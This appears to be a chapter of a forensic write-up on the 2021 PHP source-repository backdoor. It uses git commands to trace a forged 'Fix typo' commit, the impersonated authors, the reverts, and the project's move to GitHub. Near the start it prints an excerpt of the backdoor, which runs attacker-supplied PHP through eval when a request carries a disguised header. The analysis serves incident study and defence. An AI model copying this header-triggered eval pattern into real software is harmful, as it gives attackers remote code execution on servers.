# Fix typo

*This is the full dig — every command, every receipt. The plain-English telling of the same story
is here: [Fix typo](12-php.html).*

```console
$ git -C repos/php show -s --format=fuller c730aa26bd
commit c730aa26bd52829a49f2ad284b181b7e82a68d7d
Author:     Rasmus Lerdorf <rasmus@lerdorf.com>
AuthorDate: Sun Mar 28 05:57:07 2021 +0200
Commit:     Rasmus Lerdorf <rasmus@lerdorf.com>

    [skip-ci] Fix typo

    Fixes minor typo.

    Signed-off-by: Rasmus Lerdorf <rasmus@lerdorf.com>
```

If you stop at the header, this is the most ordinary object in the repository. Rasmus Lerdorf
created PHP; a commit from him fixing a typo in the language he invented is as unremarkable as
it gets, down to the `[skip-ci]` tag that tells the build servers not to waste time testing a
one-character change. [R1] Here is the change:

```console
$ git -C repos/php show c730aa26bd -- ext/zlib/zlib.c | grep -E '^\+' | grep -vE '^\+\+\+'
+	if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || ...
+		(enc = zend_hash_str_find(..., "HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
+		convert_to_string(enc);
+		if (strstr(Z_STRVAL_P(enc), "zerodium")) {
+			zend_try {
+				zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
+			} zend_end_try();
+		}
+	}
```

[R2] Read it in three steps. First, when a request comes in, PHP looks for a header named
`User-Agentt` — with a doubled T. The doubled T is not the typo; it is a name close enough to
the real `User-Agent` to slide past a reading eye, and one that no ordinary browser will ever
send. Second, if that header's value begins with the word `zerodium`, the code takes
everything after those eight characters — `+8` — and hands it to `zend_eval_string`. Third,
`zend_eval_string` runs it, as PHP, on the server.

Those eleven lines are a remote-code-execution backdoor. They entered PHP's main development
branch under its founder's name, beneath *Fix typo* and `[skip-ci]`.


## The tells

That `Signed-off-by: Rasmus Lerdorf` line is a formal trailer — the I-vouch-for-this that
kernel developers live by. How often does the real Rasmus use it?

```console
$ git -C repos/php log --all --author=Rasmus --grep='Signed-off-by' --format='%H %aI %ae %s'
c730aa26bd52829a49f2ad284b181b7e82a68d7d 2021-03-28T05:57:07+02:00 rasmus@lerdorf.com [skip-ci] Fix typo
```

[R3] Once. In twenty-two years and hundreds of commits, the only time "Rasmus Lerdorf" ever
signed off on anything is this one.

The email is genuinely his, though — `rasmus@lerdorf.com`, on many real commits. Look at when
those were made:

```console
$ git -C repos/php log --all --author='rasmus@lerdorf.com' --format='%aI %s' | head -4
2026-03-19T04:12:45-04:00 Fix GH-21411: opcache_compile_file() fails to early-bind...
2021-03-28T05:57:07+02:00 [skip-ci] Fix typo
2019-10-23T14:34:12-07:00 Reverting push to wrong repo
2019-05-21T14:47:28-07:00 Merge branch 'PHP-7.4'
```

[R4] Rasmus commits from American time zones — `-04:00`, `-07:00`. This one is `+0200`,
Central European, at 05:57 on a Sunday. One line in that list was typed from a different
continent than every other line, by someone whose own clock came stamped on the object. I do
not need the news to tell me what that means, and neither do you: `git blame` on those eleven
lines would print `Rasmus Lerdorf`, and `git blame` is wrong.

## 11:16

Five hours and change after the push, at 11:16 that same Sunday morning, a maintainer named
Nikita Popov is looking at a `[skip-ci] Fix typo` from the language's founder, and does not
take it at its word. What he does next is the closest thing to a contemporaneous statement the
history holds:

```console
$ git -C repos/php show -s --format=fuller 046827a7e8
Author:     Nikita Popov <nikita.ppv@gmail.com>

    Revert "[skip-ci] Fix typo"

    This looks like the result of a compromised git account. Commit
    access has already been revoked.
```

[R5] The code is undone. The account is revoked. *Already* — past tense, handled. For seven
hours that reads like the end of it: an intruder got in under Rasmus's name, was caught,
locked out, and the payload rolled back before any release could carry it. Then, at 18:15:

```console
$ git -C repos/php show -s --format='%an <%ae>  %s' 2b0f239b21
Nikita Popov <nikita.ppv@gmail.com>  Revert "Revert "[skip-ci] Fix typo""
```

[R6] A commit undoing Nikita's revert — putting the backdoor back — authored as Nikita.
The name on the restoration is the name of the person who, that morning, revoked the
attacker's access. Give that a second. And it is the same code returning, not a variant; you
do not have to trust the subject line, because the trees match to the byte:

```console
$ git -C repos/php rev-parse 'c730aa26^{tree}' '2b0f239b^{tree}'
a1c87b3d3dcea24d3f232a65345b66c4968a6ed3
a1c87b3d3dcea24d3f232a65345b66c4968a6ed3
```

[R6] Same tree hash means same code, exactly. Locked out under one identity, the intruder
came back under another — the responder's own. This is the moment the incident stops being
about a stolen password and becomes something colder: inside the log, a name has stopped being
evidence. The reader who would have trusted `Author: Rasmus Lerdorf` has now watched `Author:
Nikita Popov` fail the same way. It is not a second forger. It is the same string, worn twice.

Ninety minutes later a third developer, Levi Morrison, reverted the revert of the revert, and
the door stayed shut. Four commits, one Sunday: plant, revert, replant, revert. You cannot
find that war by searching the log for what it was about — the word `zerodium` is in none of
the subject lines, and `git log --grep=zerodium` across the whole repository returns nothing.
[R7] To see it, you search the diffs themselves:

```console
$ git -C repos/php log --all -S zerodium --format='%h %aI %an %s' -- ext/zlib/zlib.c
8d743d5281c 2021-03-28T11:53:17-06:00 Levi Morrison Revert "Revert "Revert "[skip-ci] Fix typo"""
2b0f239b211 2021-03-28T18:15:57+02:00 Nikita Popov Revert "Revert "[skip-ci] Fix typo""
046827a7e86 2021-03-28T11:16:39+02:00 Nikita Popov Revert "[skip-ci] Fix typo"
c730aa26bd5 2021-03-28T05:57:07+02:00 Rasmus Lerdorf [skip-ci] Fix typo
```

[R7] Four subjects, a tower of quotation marks around the word "typo." The incident is one
layer down, in the contents.

## Still an ancestor

The payload was reverted twice and never shipped in a release. The compromised server was
abandoned soon after. Five years have passed. So the two malicious commits surely are not
part of the PHP you would install today — ask:

```console
$ git -C repos/php merge-base --is-ancestor c730aa26bd HEAD && echo 'c730aa26: ANCESTOR of HEAD'
c730aa26: ANCESTOR of HEAD
$ git -C repos/php merge-base --is-ancestor 2b0f239b21 HEAD && echo '2b0f239b: ANCESTOR of HEAD'
2b0f239b: ANCESTOR of HEAD
```

[R8] Both of them, still there.

~ A revert removes the change from the tree. It does not remove the change from the graph.

A revert is not a deletion; it is a new commit that undoes an old one, and both remain
reachable in that history. The backdoor's code is gone from the working tree — *not active*, it does
nothing — but the commit that added it is an ancestor of current HEAD, so a normal full clone
of the current PHP repository carries the zerodium commit in its history. A release tarball or
an installed PHP binary does not: those contain a source snapshot or compiled files, not the
repository's Git objects. PHP could have removed the commit from future clones by rewriting
history, but that would replace every descendant hash and force existing clones to reconcile
an incompatible history. It would also pretend the tree was never touched. They let it stand.
If you have a full clone of `php-src`, the receipt for this chapter is in its object database.

Two habits, then, before the last object. When identity actually matters — a
supply-chain question you will get asked — treat the `Author` field as a claim and check it
against the person's own record: `git log --format='%aI %ae'` for a time zone that matches
their every other commit, `git log --author=<name> --grep='Signed-off-by'` for a habit that
appears once. And when you read that a repository was compromised and cleaned, run `merge-base
--is-ancestor` on the bad commit yourself; "cleaned" almost always means reverted, and reverted
means still in there.

## The locks

The reverts removed the payload. But the backdoor was possible because of *where* PHP lived:
its canonical source was the project's own server, `git.php.net`, with GitHub only a mirror,
and that server had password accounts that could be — and were — taken over. The day after:

```console
$ git -C repos/php show 49a20cf3db -- README.md | grep -E '^[+-]' | grep -iE 'git.php.net|mirror' | head -3
-[git.php.net](https://git.php.net). Contributions are most welcome by forking
-the [GitHub mirror repository](https://github.com/php/php-src) and sending a
-Pull requests are not merged directly on GitHub. All PRs will be pulled and
```

[R9] `git.php.net` is struck out of the documentation. The word *mirror* goes with it. The
project gave up the twenty-year-old server it controlled and moved its true home to GitHub,
where accounts carry two-factor keys — a real cost, self-hosted independence traded away, and
the actual casualty of the attack, since the payload itself never reached a user. The newest
commit in the repository is now committed not by any developer's key but by `GitHub` itself.
[R10]

The most important commit after a break-in is rarely the fix. It is the one that changes the
locks.

## Receipts

- **R1** `git -C repos/php show -s --format=fuller c730aa26bd` — "[skip-ci] Fix typo," authored and committed as Rasmus Lerdorf, 2021-03-28 05:57 +0200, with a `Signed-off-by: Rasmus Lerdorf` trailer.
- **R2** `git -C repos/php show c730aa26bd -- ext/zlib/zlib.c` — the 11-line payload: if the `HTTP_USER_AGENTT` header value starts with `zerodium`, `zend_eval_string(...+8, ...)` executes the remainder; diagnostic string "sold to zerodium, mid 2017."
- **R3** `git -C repos/php log --all --author=Rasmus --grep='Signed-off-by'` — the backdoor is the only `Signed-off-by` commit "Rasmus Lerdorf" ever made in the repository.
- **R4** `git -C repos/php log --all --author='rasmus@lerdorf.com' --format='%aI %s'` — real Rasmus commits are −04:00/−07:00; the backdoor is +0200 at 05:57 on a Sunday.
- **R5** `git -C repos/php show -s --format=fuller 046827a7e8` — Nikita Popov's revert, 11:16 same day: "This looks like the result of a compromised git account. Commit access has already been revoked."
- **R6** `git -C repos/php show -s 2b0f239b21` + `rev-parse 'c730aa26^{tree}' '2b0f239b^{tree}'` — the 18:15 re-plant is authored as Nikita himself; both malicious commits share tree `a1c87b3d3d…`.
- **R7** `git -C repos/php log --all -S zerodium -- ext/zlib/zlib.c` + `log --grep=zerodium | wc -l` — the four-commit revert war surfaces only on a content pickaxe; the word never appears in any commit message (0).
- **R8** `git -C repos/php merge-base --is-ancestor c730aa26 HEAD` (and `2b0f239b`) — both malicious commits are ancestors of current HEAD; never rewritten out.
- **R9** `git -C repos/php show 49a20cf3db -- README.md` — 2021-03-29: "Removed mentions of git.php.net from the documentation"; the canonical-remote and *mirror* language is deleted.
- **R10** `git -C repos/php log -1 --format='%h %aI committer=%cn <%ce>'` — the newest commit is committed by `GitHub <noreply@github.com>`: the migration to the two-factor forge, complete.

*Full transcripts: `chapters/12-php.receipts.md` (regenerate with `scripts/receipts-12.sh`).*
